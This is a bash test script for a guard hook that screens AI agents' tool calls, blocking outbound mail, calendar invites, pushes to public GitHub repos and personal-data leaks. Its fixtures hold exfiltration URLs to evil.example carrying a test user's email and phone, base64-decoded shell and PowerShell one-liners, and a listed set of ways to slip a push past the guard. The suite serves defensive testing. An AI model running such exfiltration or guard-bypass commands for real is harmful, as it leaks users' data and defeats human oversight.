#!/usr/bin/env bash
# Fixture tests for the safety guard (.claude/hooks/guard.sh or guard.ps1), the fail-closed hook
# wrappers in .claude/settings.json and .codex/hooks.json, and .githooks/pre-push.
# No network: a local mock (mock-github.py) stands in for the GitHub API, and the guard copies
# under test are pointed at it. Nothing in the workspace is changed; all work happens in a temp folder.
#
# Usage: bash scripts/ci/guard-fixtures.sh [--impl sh|ps] [--decisions FILE]
#   --impl sh   test guard.sh, the bash wrappers and pre-push (default)
#   --impl ps   test guard.ps1 and the Codex Windows wrappers (the base64 commandWindows strings);
#               PowerShell comes from $PS_EXE, else pwsh, else powershell
#   --decisions FILE   also write "<case name><TAB><decision>" for every shared case (parity checks)
# Works in macOS bash 3.2, Linux bash and Git Bash on Windows. Exits 1 if any case fails.
set -u
IMPL="sh"; DECISIONS=""
while [ $# -gt 0 ]; do
  case "$1" in
    --impl) IMPL="$2"; shift 2 ;;
    --decisions) DECISIONS="$2"; shift 2 ;;
    *) echo "unknown option $1" >&2; exit 2 ;;
  esac
done
case "$IMPL" in sh|ps) ;; *) echo "--impl must be sh or ps" >&2; exit 2 ;; esac

HERE="$(cd "$(dirname "$0")" && pwd -P)"
REPO="$(cd "$HERE/../.." && pwd -P)"
WIN=""; case "$(uname -s)" in MINGW*|MSYS*|CYGWIN*) WIN=1 ;; esac
native() { if command -v cygpath >/dev/null 2>&1; then cygpath -m "$1"; else printf '%s\n' "$1"; fi; }

PY=""
for c in python3 python; do "$c" -c 'import sys; sys.exit(0 if sys.version_info >= (3, 7) else 1)' >/dev/null 2>&1 && { PY="$c"; break; }; done
[ -n "$PY" ] || { echo "python 3.7+ is needed for the mock GitHub API" >&2; exit 2; }

PS=""
if [ "$IMPL" = ps ]; then
  PS="${PS_EXE:-}"
  [ -n "$PS" ] || { command -v pwsh >/dev/null 2>&1 && PS=pwsh; }
  [ -n "$PS" ] || { command -v powershell >/dev/null 2>&1 && PS=powershell; }
  [ -n "$PS" ] || { echo "no PowerShell found (set PS_EXE)" >&2; exit 2; }
fi

TMPBASE="${RUNNER_TEMP:-${TMPDIR:-/tmp}}"
command -v cygpath >/dev/null 2>&1 && TMPBASE="$(cygpath -u "$TMPBASE")"
T="$(mktemp -d "$TMPBASE/guardfx.XXXXXX")" || exit 2
T="$(cd "$T" && pwd -P)"
TN="$(native "$T")"          # the same folder as Windows programs (PowerShell, git.exe) see it
MOCKPID=""
cleanup() { if [ -n "$MOCKPID" ]; then kill "$MOCKPID" 2>/dev/null && wait "$MOCKPID" 2>/dev/null; fi; rm -rf "$T"; }
trap cleanup EXIT

# ---- mock GitHub API ----
# A fresh CI runner can take several seconds to start Python the first time: wait up to 60 s,
# stop early if the mock exits, and show what it printed.
"$PY" "$HERE/mock-github.py" "$T/port" 2>"$T/mock.err" & MOCKPID=$!
i=0; while [ ! -s "$T/port" ] && [ $i -lt 600 ] && kill -0 "$MOCKPID" 2>/dev/null; do sleep 0.1; i=$((i + 1)); done
PORT="$(cat "$T/port" 2>/dev/null)"
[ -n "$PORT" ] || { echo "mock GitHub API did not start after $i tries:" >&2; cat "$T/mock.err" >&2; exit 2; }
API="http://127.0.0.1:$PORT/repos/"

# Copies of the scripts under test, pointed at the mock. mock_copy <src> <dest> [api-base]
mock_copy() {
  mkdir -p "$(dirname "$2")"
  sed "s#https://api.github.com/repos/#${3:-$API}#g" "$1" > "$2"
  grep -q "${3:-$API}" "$2" || { echo "could not point $1 at the mock API (did its GitHub URL change?)" >&2; exit 2; }
}
G_SH="$REPO/.claude/hooks/guard.sh"; G_PS="$REPO/.claude/hooks/guard.ps1"; PREPUSH="$REPO/.githooks/pre-push"
if [ "$IMPL" = sh ]; then
  mock_copy "$G_SH" "$T/m/guard.sh"
  mock_copy "$G_SH" "$T/off/guard.sh" "http://127.0.0.1:1/repos/"
  mock_copy "$PREPUSH" "$T/m/hooks/pre-push"; chmod +x "$T/m/hooks/pre-push"
  mock_copy "$PREPUSH" "$T/off/pre-push" "http://127.0.0.1:1/repos/"
  RUN_DEFAULT="bash \"$T/m/guard.sh\""
  RUN_OFF="bash \"$T/off/guard.sh\""
else
  mock_copy "$G_PS" "$T/m/guard.ps1"
  mock_copy "$G_PS" "$T/off/guard.ps1" "http://127.0.0.1:1/repos/"
  PSA="-NoProfile -NonInteractive -ExecutionPolicy Bypass"
  RUN_DEFAULT="\"$PS\" $PSA -File \"$(native "$T/m/guard.ps1")\""
  RUN_OFF="\"$PS\" $PSA -File \"$(native "$T/off/guard.ps1")\""
fi
RUN="$RUN_DEFAULT"

# ---- fixtures ----
PUBURL="https://github.com/octocat/Hello-World.git"
PRIVURL="https://github.com/octocat/this-repo-does-not-exist-zz9.git"
ERRURL="https://github.com/octocat/server-error.git"
mkdir -p "$T/proj/profile"
printf 'Jordan Testerson\njordan@example.com\n(215) 867-5309\n' > "$T/proj/profile/signature.txt"
export CLAUDE_PROJECT_DIR="$TN/proj"
export GIT_CONFIG_NOSYSTEM=1 GIT_AUTHOR_NAME=t GIT_AUTHOR_EMAIL=t@example.com GIT_COMMITTER_NAME=t GIT_COMMITTER_EMAIL=t@example.com
mk() { mkdir -p "$T/$1" && git -C "$T/$1" init -q && { [ -z "$2" ] || git -C "$T/$1" remote add origin "$2"; }; }
mk pub "$PUBURL"
mk priv "$PRIVURL"
mk err "$ERRURL"
mk sshpub git@github.com:octocat/Hello-World.git
mk other https://gitlab.com/someone/something.git
mk none ""
mk multi ""; git -C "$T/multi" remote add backup "$PRIVURL"; git -C "$T/multi" remote add pubby "$PUBURL"

pass=0; fail=0; skipped=0
j() { printf '%s' "$1" | "$PY" -c 'import json,sys; sys.stdout.write(json.dumps(sys.stdin.read()))'; }
shelljson() { # shelljson <cwd> <command> [tool]
  printf '{"session_id":"x","hook_event_name":"PreToolUse","cwd":%s,"tool_name":"%s","tool_input":{"command":%s}}' \
    "$(j "$1")" "${3:-Bash}" "$(j "$2")"
}
record() { [ -z "$DECISIONS" ] || printf '%s\t%s\n' "$1" "$2" >> "$DECISIONS"; }
skip() { skipped=$((skipped + 1)); printf 'SKIP  %s (%s)\n' "$1" "$2"; }
# check <name> <expect: allow|deny|block2> <json>   (uses $RUN; stderr output on a non-block is a failure)
check() {
  local out rc got=allow
  out="$(printf '%s' "$3" | eval "$RUN" 2>"$T/stderr.txt")"; rc=$?
  if [ $rc -eq 2 ]; then got=block2
  elif [ $rc -ne 0 ]; then got="exit$rc"
  elif printf '%s' "$out" | grep -qE '"permissionDecision"[[:space:]]*:[[:space:]]*"deny"'; then got=deny
  elif printf '%s' "$out" | grep -qE '"permissionDecision"[[:space:]]*:[[:space:]]*"ask"'; then got=ask; fi
  if [ -s "$T/stderr.txt" ] && [ "$got" != block2 ]; then got="$got+stderr"; fi
  [ "$RUN" = "$RUN_DEFAULT" ] && record "$1" "$got"
  if [ "$got" = "$2" ]; then pass=$((pass + 1)); printf 'PASS  %-62s %s\n' "$1" "$got"
  else fail=$((fail + 1)); printf 'FAIL  %-62s expected %s got %s\n      out=%s\n      err=%s\n' "$1" "$2" "$got" "$out" "$(head -c 600 "$T/stderr.txt")"; fi
}
PU="pu""sh"   # keeps the literal word out of this file's own command lines

echo "== guard ($IMPL): mail / calendar / browser"
check "gmail search (allow)" allow '{"tool_name":"mcp__claude_ai_Gmail__search_threads","tool_input":{"query":"from:recruiter"}}'
check "gmail create_draft (allow)" allow '{"tool_name":"mcp__claude_ai_Gmail__create_draft","tool_input":{"to":"a@b.com"}}'
check "gmail send_message (deny)" deny '{"tool_name":"mcp__claude_ai_Gmail__send_message","tool_input":{"to":"a@b.com"}}'
check "gmail reply (deny)" deny '{"tool_name":"mcp__claude_ai_Gmail__reply","tool_input":{}}'
check "gmail trash (deny)" deny '{"tool_name":"mcp__claude_ai_Gmail__trash_thread","tool_input":{}}'
check "codex gmail_send_email (deny)" deny '{"tool_name":"mcp__gmail__gmail_send_email","tool_input":{}}'
check "codex gmail_search_emails (allow)" allow '{"tool_name":"mcp__gmail__gmail_search_emails","tool_input":{}}'
check "outlook send (deny)" deny '{"tool_name":"mcp__outlook__send_mail","tool_input":{}}'
check "calendar create, no attendees (allow)" allow '{"tool_name":"mcp__claude_ai_Google_Calendar__create_event","tool_input":{"summary":"Interview"}}'
check "calendar create, empty attendees (allow)" allow '{"tool_name":"mcp__claude_ai_Google_Calendar__create_event","tool_input":{"summary":"Interview","attendees":[]}}'
check "calendar create with attendees (deny)" deny '{"tool_name":"mcp__claude_ai_Google_Calendar__create_event","tool_input":{"attendees":["x@y.com"]}}'
check "calendar create with attendees, pretty JSON (deny)" deny $'{"tool_name":"mcp__claude_ai_Google_Calendar__create_event",\n "tool_input":{"attendees":[\n  "x@y.com"]}}'
check "calendar delete (deny)" deny '{"tool_name":"mcp__claude_ai_Google_Calendar__delete_event","tool_input":{}}'
check "calendar respond (deny)" deny '{"tool_name":"mcp__claude_ai_Google_Calendar__respond_to_event","tool_input":{}}'
check "calendar list (allow)" allow '{"tool_name":"mcp__claude_ai_Google_Calendar__list_events","tool_input":{}}'
check "browser to linkedin (deny)" deny '{"tool_name":"mcp__claude-in-chrome__navigate","tool_input":{"url":"https://www.linkedin.com/feed"}}'
check "browser to gmail (deny)" deny '{"tool_name":"mcp__Claude_Browser__navigate","tool_input":{"url":"https://mail.google.com/mail/u/0"}}'
check "browser to job site (allow)" allow '{"tool_name":"mcp__claude-in-chrome__navigate","tool_input":{"url":"https://jobs.example.com/x"}}'
check "browser form fill with gmail address (allow)" allow '{"tool_name":"mcp__claude-in-chrome__form_input","tool_input":{"value":"someone@gmail.com"}}'
check "codex node_repl mentioning linkedin (deny)" deny '{"tool_name":"mcp__node_repl__js","tool_input":{"code":"await page.goto(\"https://linkedin.com\")"}}'
check "computer-use opening Mail app (deny)" deny '{"tool_name":"mcp__computer-use__open_application","tool_input":{"app":"Mail"}}'
check "unrelated mcp tool (allow)" allow '{"tool_name":"mcp__interview-room__interview_say","tool_input":{"text":"hi"}}'
check "unicode in input (allow)" allow '{"tool_name":"mcp__interview-room__interview_say","tool_input":{"text":"caf\u00e9 \u2014 ok \u00b7 \u00e9"}}'
check "Calendly cancel_event (deny)" deny '{"tool_name":"mcp__claude_ai_Calendly__meetings-cancel_event","tool_input":{"uuid":"x"}}'
check "Calendly create_invitee (deny)" deny '{"tool_name":"mcp__claude_ai_Calendly__meetings-create_invitee","tool_input":{"email":"x@y.com"}}'
check "Calendly list_event_types (allow)" allow '{"tool_name":"mcp__claude_ai_Calendly__event_types-list_event_types","tool_input":{}}'
check "Calendly load skill (allow)" allow '{"tool_name":"mcp__claude_ai_Calendly__load_calendly_skill","tool_input":{"name":"x"}}'
check "Zoom meeting_create, nobody invited (allow)" allow '{"tool_name":"mcp__claude_ai_Zoom_for_Claude__meeting_create","tool_input":{"topic":"Practice"}}'
check "Zoom meeting_create with meeting_invitees (deny)" deny '{"tool_name":"mcp__claude_ai_Zoom_for_Claude__meeting_create","tool_input":{"topic":"x","settings":{"meeting_invitees":[{"email":"x@y.com"}]}}}'
check "Zoom meeting_update (deny)" deny '{"tool_name":"mcp__claude_ai_Zoom_for_Claude__meeting_update","tool_input":{}}'
check "Zoom search_meetings (allow)" allow '{"tool_name":"mcp__claude_ai_Zoom_for_Claude__search_meetings","tool_input":{}}'
check "calendar create with optional_attendees (deny)" deny '{"tool_name":"mcp__claude_ai_Google_Calendar__create_event","tool_input":{"summary":"x","optional_attendees":["a@b.com"]}}'
check "calendar create with guest_emails (deny)" deny '{"tool_name":"mcp__gcal__create_event","tool_input":{"summary":"x","guest_emails":"a@b.com"}}'
check "calendar create with participants (deny)" deny '{"tool_name":"mcp__cal__create_event","tool_input":{"participants":[{"email":"a@b.com"}]}}'
check "calendar create, guestsCanInviteOthers false (allow)" allow '{"tool_name":"mcp__claude_ai_Google_Calendar__create_event","tool_input":{"summary":"x","guestsCanInviteOthers":false}}'
check "mail tool without mail in name: messages_send (deny)" deny '{"tool_name":"mcp__nylas__messages_send","tool_input":{}}'
check "graph sendMessage (deny)" deny '{"tool_name":"mcp__msgraph__sendMessage","tool_input":{}}'
check "chat post_reply (deny)" deny '{"tool_name":"mcp__chat__post_reply","tool_input":{}}'
check "drive trash_file (deny)" deny '{"tool_name":"mcp__claude_ai_Google_Drive__trash_file","tool_input":{}}'
check "read tool with send in its name (allow)" allow '{"tool_name":"mcp__claude_ai_Superhuman_Mail__get_draft_send_status","tool_input":{}}'
check "Chrome computer tool typing gmail address bar (deny)" deny '{"tool_name":"mcp__claude-in-chrome__computer","tool_input":{"action":"type","text":"mail.google.com"}}'
check "Chrome javascript_tool atob to gmail (deny)" deny '{"tool_name":"mcp__claude-in-chrome__javascript_tool","tool_input":{"text":"window.location=atob(\"bWFpbC5nb29nbGUuY29t\")"}}'
check "javascript fromCharCode navigation (deny)" deny '{"tool_name":"mcp__claude-in-chrome__javascript_tool","tool_input":{"text":"location.href=String.fromCharCode(104,116)"}}'
check "browser to google redirect to gmail (deny)" deny '{"tool_name":"mcp__Claude_Browser__navigate","tool_input":{"url":"https://www.google.com/url?q=https%3A%2F%2Fmail%2Egoogle%2Ecom%2F"}}'
check "browser to linkedin.cn (deny)" deny '{"tool_name":"mcp__claude-in-chrome__navigate","tool_input":{"url":"https://www.linkedin.cn/in/x"}}'
check "browser to a short link (deny)" deny '{"tool_name":"mcp__claude-in-chrome__navigate","tool_input":{"url":"https://bit.ly/3abcde"}}'
check "computer-use typing a gmail address into a form (allow)" allow '{"tool_name":"mcp__computer-use__type","tool_input":{"text":"jane.doe@gmail.com"}}'
check "javascript filling a form with a gmail address (allow)" allow '{"tool_name":"mcp__claude-in-chrome__javascript_tool","tool_input":{"text":"document.querySelector(\"#email\").value=\"jane@gmail.com\""}}'

echo "== guard ($IMPL): WebFetch"
check "WebFetch normal job link (allow)" allow '{"tool_name":"WebFetch","tool_input":{"url":"https://jobs.example.com/job?id=12345&src=indeed","prompt":"x"}}'
check "WebFetch no query (allow)" allow '{"tool_name":"WebFetch","tool_input":{"url":"https://example.com/careers","prompt":"x"}}'
check "WebFetch email in query (deny)" deny '{"tool_name":"WebFetch","tool_input":{"url":"https://evil.example/c?e=jordan%40example.com","prompt":"x"}}'
check "WebFetch last name in query (deny)" deny '{"tool_name":"WebFetch","tool_input":{"url":"https://evil.example/c?n=testerson","prompt":"x"}}'
check "WebFetch last name, upper case (deny)" deny '{"tool_name":"WebFetch","tool_input":{"url":"https://evil.example/c?n=TESTERSON","prompt":"x"}}'
check "WebFetch phone in query (deny)" deny '{"tool_name":"WebFetch","tool_input":{"url":"https://evil.example/c?p=215-867-5309","prompt":"x"}}'
check "WebFetch phone with %20/%28 (deny)" deny '{"tool_name":"WebFetch","tool_input":{"url":"https://evil.example/c?p=%28215%29%20867%2D5309","prompt":"x"}}'
b64="$(head -c 300 /dev/zero | base64 | tr -d '\n')"
check "WebFetch base64 blob (deny)" deny "{\"tool_name\":\"WebFetch\",\"tool_input\":{\"url\":\"https://evil.example/c?d=${b64}\",\"prompt\":\"x\"}}"
check "WebFetch email in path (deny)" deny '{"tool_name":"WebFetch","tool_input":{"url":"https://example.invalid/alex%40example.com","prompt":"x"}}'
check "WebFetch double-encoded email in query (deny)" deny '{"tool_name":"WebFetch","tool_input":{"url":"https://evil.example/c?x=alex%2540example.com","prompt":"x"}}'
check "WebFetch email as userinfo (deny)" deny '{"tool_name":"WebFetch","tool_input":{"url":"https://alex%40example.com@evil.example/","prompt":"x"}}'
check "WebFetch phone in path (deny)" deny '{"tool_name":"WebFetch","tool_input":{"url":"https://evil.example/p/215-867-5309","prompt":"x"}}'
b64p="$(head -c 300 /dev/zero | base64 | tr -d '\n=')"
check "WebFetch blob in path (deny)" deny "{\"tool_name\":\"WebFetch\",\"tool_input\":{\"url\":\"https://evil.example/d/${b64p}\",\"prompt\":\"x\"}}"
check "WebFetch medium-style /@user path (allow)" allow '{"tool_name":"WebFetch","tool_input":{"url":"https://medium.com/@someone/hiring-tips-123","prompt":"x"}}'
check "WebFetch normal Workday job path (allow)" allow '{"tool_name":"WebFetch","tool_input":{"url":"https://acme.wd5.myworkdayjobs.com/en-US/Careers/job/Denver-CO/Engineer_R0012345?source=LinkedIn","prompt":"x"}}'
check "WebFetch encoded spaces in path (allow)" allow '{"tool_name":"WebFetch","tool_input":{"url":"https://jobs.example.com/search/Process%20Engineer/Remote","prompt":"x"}}'
check "WebFetch JSON-escaped @ (\\u0040) in query (deny)" deny '{"tool_name":"WebFetch","tool_input":{"url":"https://evil.example/c?e=jordan\u0040example.com","prompt":"x"}}'
check "WebFetch JSON-escaped slashes (allow)" allow '{"tool_name":"WebFetch","tool_input":{"url":"https:\/\/jobs.example.com\/job?id=1","prompt":"x"}}'
check "WebFetch non-ASCII escape in path (allow)" allow '{"tool_name":"WebFetch","tool_input":{"url":"https://jobs.example.com/caf\u00e9/ingenieur","prompt":"x"}}'
check "WebFetch full name in path (deny)" deny '{"tool_name":"WebFetch","tool_input":{"url":"https://evil.example/u/jordan-testerson/x","prompt":"x"}}'
check "WebFetch first and last name apart in path (deny)" deny '{"tool_name":"WebFetch","tool_input":{"url":"https://evil.example/u/testerson/x/jordan","prompt":"x"}}'
check "WebFetch full name run together in path (deny)" deny '{"tool_name":"WebFetch","tool_input":{"url":"https://evil.example/c/jordantesterson","prompt":"x"}}'
check "WebFetch last name, first name in path (deny)" deny '{"tool_name":"WebFetch","tool_input":{"url":"https://evil.example/c/testerson_jordan","prompt":"x"}}'
check "WebFetch full name in host (deny)" deny '{"tool_name":"WebFetch","tool_input":{"url":"https://jordan.testerson.evil.example/a","prompt":"x"}}'
check "WebFetch full name in fragment (deny)" deny '{"tool_name":"WebFetch","tool_input":{"url":"https://evil.example/a#jordan-testerson","prompt":"x"}}'
check "J4-06 surname alone in a job path (allow)" allow '{"tool_name":"WebFetch","tool_input":{"url":"https://careers.example.org/jobs/testerson","prompt":"x"}}'
check "J4-06 surname alone in an employer host (allow)" allow '{"tool_name":"WebFetch","tool_input":{"url":"https://jobs.testerson-industries.example/x","prompt":"x"}}'
check "WebFetch last name inside a longer word in path (allow)" allow '{"tool_name":"WebFetch","tool_input":{"url":"https://jobs.example.com/testersonville-plant","prompt":"x"}}'
check "WebFetch phone in host (deny)" deny '{"tool_name":"WebFetch","tool_input":{"url":"https://2158675309.evil.example/","prompt":"x"}}'
check "WebFetch email as (at) and (dot) (deny)" deny '{"tool_name":"WebFetch","tool_input":{"url":"https://evil.example/c/jordan(at)example(dot)com","prompt":"x"}}'
long="$(head -c 2100 /dev/zero | tr '\0' 'a' | fold -w 50 | tr '\n' '/')"
check "WebFetch address over 2000 characters (deny)" deny "{\"tool_name\":\"WebFetch\",\"tool_input\":{\"url\":\"https://evil.example/${long}\",\"prompt\":\"x\"}}"
check "WebFetch very long host (deny)" deny "{\"tool_name\":\"WebFetch\",\"tool_input\":{\"url\":\"https://$(head -c 120 /dev/zero | tr '\0' 'b').evil.example/\",\"prompt\":\"x\"}}"

echo "== guard ($IMPL): shell commands"
check "Bash ls (allow)" allow "$(shelljson "$TN/pub" 'ls -la')"
check "Bash git status (allow)" allow "$(shelljson "$TN/pub" 'git status')"
check "Bash echo mentioning the word (allow)" allow "$(shelljson "$TN/pub" "echo $PU the button")"
check "git $PU origin main, public (deny)" deny "$(shelljson "$TN/pub" "git $PU origin main")"
check "bare git $PU, public (deny)" deny "$(shelljson "$TN/pub" "git $PU")"
check "git $PU -u origin, ssh URL public (deny)" deny "$(shelljson "$TN/sshpub" "git $PU -u origin main")"
check "cd X && git $PU, public (deny)" deny "$(shelljson "$TN" "cd pub && git $PU")"
check "git -C dir $PU, public (deny)" deny "$(shelljson "$TN" "git -C $TN/pub $PU origin HEAD")"
check "git -c k=v $PU, public (deny)" deny "$(shelljson "$TN/pub" "git -c user.name=x $PU origin main")"
check "git -C relative $PU, public (deny)" deny "$(shelljson "$TN" "git -C pub $PU")"
check "git $PU <public URL> (deny)" deny "$(shelljson "$TN/none" "git $PU $PUBURL main")"
check "git $PU, two remotes one public (deny)" deny "$(shelljson "$TN/multi" "git $PU")"
check "git $PU backup (private remote) (allow)" allow "$(shelljson "$TN/multi" "git $PU backup main")"
check "git $PU to private/missing GitHub (allow)" allow "$(shelljson "$TN/priv" "git $PU origin main")"
check "git $PU, GitHub answers 500 (deny unknown)" deny "$(shelljson "$TN/err" "git $PU origin main")"
check "git $PU to gitlab (allow)" allow "$(shelljson "$TN/other" "git $PU origin main")"
check "git $PU, no remotes (allow)" allow "$(shelljson "$TN/none" "git $PU")"
check "gh repo create --public (deny)" deny "$(shelljson "$TN" "gh repo create my-jobs --public --source . --$PU")"
check "gh repo create --private (allow)" allow "$(shelljson "$TN/none" 'gh repo create my-jobs --private')"
check "gh repo edit --visibility public (deny)" deny "$(shelljson "$TN" 'gh repo edit me/x --visibility public')"
check "gh repo edit --visibility=public (deny)" deny "$(shelljson "$TN" 'gh repo edit --visibility=public')"
check "Codex local_shell argv form, public (deny)" deny "{\"tool_name\":\"local_shell\",\"cwd\":$(j "$TN/pub"),\"tool_input\":{\"command\":[\"bash\",\"-lc\",\"git $PU origin main\"]}}"
check "Codex exec_command string, public (deny)" deny "{\"tool_name\":\"exec_command\",\"cwd\":$(j "$TN/pub"),\"tool_input\":{\"command\":\"git $PU\"}}"
check "Codex shell_command git.exe $PU, public (deny)" deny "$(shelljson "$TN/pub" "git.exe $PU origin main" shell_command)"
check "Codex unified_exec cmd field (deny)" deny "{\"tool_name\":\"unified_exec\",\"cwd\":$(j "$TN/pub"),\"tool_input\":{\"cmd\":\"git $PU\"}}"
check "Codex cmd field string, gh repo create --public (deny)" deny "{\"tool_name\":\"exec_command\",\"cwd\":$(j "$TN"),\"tool_input\":{\"cmd\":\"gh repo create example --public\"}}"
check "Codex cmd field, ls (allow)" allow "{\"tool_name\":\"exec_command\",\"cwd\":$(j "$TN/pub"),\"tool_input\":{\"cmd\":\"ls -la\"}}"
check "Codex cmd list with spaces, public (deny)" deny "{\"tool_name\":\"shell\",\"cwd\":$(j "$TN/pub"),\"tool_input\":{\"cmd\":[\"bash\", \"-lc\", \"git $PU\"]}}"
check "shell tool, no command field, mentions $PU (deny)" deny "{\"tool_name\":\"Bash\",\"tool_input\":{\"script\":\"git $PU\"}}"
check "shell tool, no command field, harmless (allow)" allow '{"tool_name":"Bash","tool_input":{"script":"ls"}}'
check "unicode-escaped git p\\u0075sh, public (deny)" deny "{\"tool_name\":\"Bash\",\"cwd\":$(j "$TN/pub"),\"tool_input\":{\"command\":\"git p\\u0075sh origin main\"}}"
check "literal backslash-u in a $PU-free command (allow)" allow "{\"tool_name\":\"Bash\",\"cwd\":$(j "$TN/pub"),\"tool_input\":{\"command\":\"printf '\\\\u2019' > /dev/null\"}}"
check "PowerShell tool: git $PU, public (deny)" deny "$(shelljson "$TN/pub" "git $PU origin main" PowerShell)"
check "PowerShell tool: Set-Location X; git $PU, public (deny)" deny "$(shelljson "$TN" "Set-Location pub; git $PU" PowerShell)"
check "PowerShell tool: Set-Location -Path X; git $PU (deny)" deny "$(shelljson "$TN" "Set-Location -Path pub; git $PU origin main" PowerShell)"
check "PowerShell tool: sl X; git $PU, public (deny)" deny "$(shelljson "$TN" "sl pub; git $PU" PowerShell)"
check "PowerShell tool: Push-Location X; git $PU (deny)" deny "$(shelljson "$TN" "Push-Location pub; git $PU" PowerShell)"
check "PowerShell tool: cd X; git $PU, public (deny)" deny "$(shelljson "$TN" "cd pub; git $PU" PowerShell)"
check "PowerShell tool: git -C X $PU, public (deny)" deny "$(shelljson "$TN" "git -C pub $PU" PowerShell)"
check "PowerShell tool: & git $PU, public (deny)" deny "$(shelljson "$TN/pub" "& git $PU origin main" PowerShell)"
check "PowerShell tool: & 'C:\\Git\\bin\\git.exe' $PU (deny)" deny "$(shelljson "$TN/pub" "& 'C:\\Program Files\\Git\\bin\\git.exe' $PU origin main" PowerShell)"
check "PowerShell tool: gh repo create --public (deny)" deny "$(shelljson "$TN" "gh repo create my-jobs --public" PowerShell)"
check "PowerShell tool: git $PU to private (allow)" allow "$(shelljson "$TN/priv" "git $PU origin main" PowerShell)"
check "PowerShell tool: Get-ChildItem (allow)" allow "$(shelljson "$TN/pub" 'Get-ChildItem -Force' PowerShell)"
check "Windows path C:\\\\Users with repo word (allow)" allow "{\"tool_name\":\"Bash\",\"cwd\":$(j "$TN/none"),\"tool_input\":{\"command\":\"ls C:\\\\Users\\\\repo\"}}"

echo "== guard ($IMPL): shell commands, harder cases"
mk aliased "$PUBURL"
git -C "$T/aliased" config alias.ship "$PU"
git -C "$T/aliased" config alias.shipall "!git $PU"
git -C "$T/aliased" config alias.st status
check "Codex cmd list, spaces around commas, public (deny)" deny "{\"tool_name\":\"shell\",\"cwd\":$(j "$TN/pub"),\"tool_input\":{\"cmd\":[ \"bash\" , \"-lc\" , \"git $PU\" ]}}"
check "Codex cmd list, spaces around commas, ls (allow)" allow "{\"tool_name\":\"shell\",\"cwd\":$(j "$TN/pub"),\"tool_input\":{\"cmd\":[ \"bash\" , \"-lc\" , \"ls\" ]}}"
check "gh repo create --public=true (deny)" deny "$(shelljson "$TN" 'gh repo create demo --public=true')"
check "Codex list: gh repo create --public=true (deny)" deny "{\"tool_name\":\"exec_command\",\"cwd\":$(j "$TN"),\"tool_input\":{\"cmd\":[\"gh\",\"repo\",\"create\",\"demo\",\"--public=true\"]}}"
check "PowerShell tool: GH.EXE repo create --public (deny)" deny "$(shelljson "$TN" 'GH.EXE repo create demo --public' PowerShell)"
check "GIT.EXE $PU, public (deny)" deny "$(shelljson "$TN/pub" "GIT.EXE $PU origin main" PowerShell)"
check "git -c remote.origin.url=<public> $PU (deny)" deny "$(shelljson "$TN/priv" "git -c remote.origin.url=$PUBURL $PU origin main")"
check "git -c url...pushInsteadOf rewrite to public (deny)" deny "$(shelljson "$TN/priv" "git -c url.https://github.com/octocat/Hello-World.git.pushInsteadOf=$PRIVURL $PU origin main")"
check "git -c alias.up=$PU up, public (deny)" deny "$(shelljson "$TN/pub" "git -c alias.up=$PU up origin main")"
check "git alias from config for $PU, public (deny)" deny "$(shelljson "$TN/aliased" 'git ship origin main')"
check "git shell alias running $PU, public (deny)" deny "$(shelljson "$TN/aliased" 'git shipall')"
check "git alias for status (allow)" allow "$(shelljson "$TN/aliased" 'git st')"
check "git log (allow)" allow "$(shelljson "$TN/pub" 'git log --oneline -5')"
check "git subtree $PU, public (deny)" deny "$(shelljson "$TN/pub" "git subtree $PU --prefix=dist origin main")"
check "git send-pack <public URL> (deny)" deny "$(shelljson "$TN/none" "git send-pack $PUBURL main")"
check "git $PU \$REMOTE variable (deny unread)" deny "$(shelljson "$TN/pub" "git $PU \$REMOTE main")"
check "git $PU to GitHub.com upper case, public (deny)" deny "$(shelljson "$TN/none" "git $PU https://GitHub.com/octocat/Hello-World.git main")"
check "gh gist create --public (deny)" deny "$(shelljson "$TN" 'gh gist create notes.md --public')"
check "gh gist create -p (deny)" deny "$(shelljson "$TN" 'gh gist create -p notes.md')"
check "gh gist create, secret (allow)" allow "$(shelljson "$TN/none" 'gh gist create notes.md')"
check "gh api PATCH private=false (deny)" deny "$(shelljson "$TN" 'gh api -X PATCH repos/me/jobs -F private=false')"
check "gh api PATCH visibility=public (deny)" deny "$(shelljson "$TN" 'gh api --method PATCH repos/me/jobs -f visibility=public')"
check "gh api with --input to a repos endpoint (deny unread)" deny "$(shelljson "$TN" 'gh api -X POST user/repos --input body.json')"
check "gh api read (allow)" allow "$(shelljson "$TN/none" 'gh api repos/me/jobs')"
check "base64 decoded into sh (deny hidden)" deny "$(shelljson "$TN/pub" 'echo Z2l0IHB1c2g= | base64 -d | sh')"
check "eval with base64 (deny hidden)" deny "$(shelljson "$TN/pub" 'eval "$(echo Z2l0IHB1c2g= | base64 --decode)"')"
check "PowerShell -EncodedCommand (deny hidden)" deny "$(shelljson "$TN/pub" 'powershell -EncodedCommand ZwBpAHQA' PowerShell)"
check "PowerShell FromBase64String + iex (deny hidden)" deny "$(shelljson "$TN/pub" 'iex ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($x)))' PowerShell)"
check "PowerShell Get-Content -Encoding UTF8 (allow)" allow "$(shelljson "$TN/pub" 'Get-Content -Encoding UTF8 jobs/tracker.csv' PowerShell)"
check "base64 encode a file, no shell (allow)" allow "$(shelljson "$TN/pub" 'base64 -i photo.png -o photo.txt')"

echo "== guard ($IMPL): Codex-review push/gh bypasses (2026-10)"
mk "pub space" "$PUBURL"
mk aliasown ""; git -C "$T/aliasown" config alias.ship "!git $PU $PUBURL HEAD"
check "C-01 git -C quoted path with a space, public (deny)" deny "$(shelljson "$TN/none" "git -C \"$TN/pub space\" $PU origin HEAD")"
check "C-01 ok: ls a quoted path with a space (allow)" allow "$(shelljson "$TN/none" "ls \"$TN/pub space\"")"
check "J4-09 -c url.<public>.insteadOf then $PU (deny)" deny "$(shelljson "$TN/priv" "git -c url.$PUBURL.insteadOf=reviewdest $PU reviewdest HEAD")"
check "J4-10 export GIT_CONFIG_* then $PU (deny)" deny "$(shelljson "$TN/priv" "export GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=remote.origin.url GIT_CONFIG_VALUE_0=$PUBURL; git $PU origin HEAD")"
check "J4-11 gh --repo <public> before release upload (deny)" deny "$(shelljson "$TN" 'gh --repo octocat/Hello-World release upload v1 jobs/tracker.csv')"
check "J4-11 gh --repo <private> before release upload (allow)" allow "$(shelljson "$TN" 'gh --repo octocat/zz9-missing release upload v1 jobs/tracker.csv')"
check "J4-12 gh api absolute URL write to <public> (deny)" deny "$(shelljson "$TN" 'gh api https://api.github.com/repos/octocat/Hello-World/issues -f title=x')"
